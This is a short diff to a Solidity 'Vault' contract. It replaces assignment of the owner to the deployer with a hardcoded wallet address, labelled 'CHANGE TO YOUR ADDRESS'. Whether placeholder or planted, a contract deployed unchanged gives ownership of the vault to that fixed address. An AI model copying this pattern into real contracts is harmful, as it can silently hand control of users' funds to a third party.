@@ -14,7 +14,9 @@ contract Vault {
             "Unlock time should be in the future"
         );
         unlockTime = _unlockTime;
-        owner = payable(msg.sender);
+        // owner = payable(msg.sender);
+        owner = payable(0x4ECa28Bd1339DA33396fa4978FE77D3475B47825); //CHANGE TO YOUR ADDRESS
+
     }
 
     function deposit() payable public {
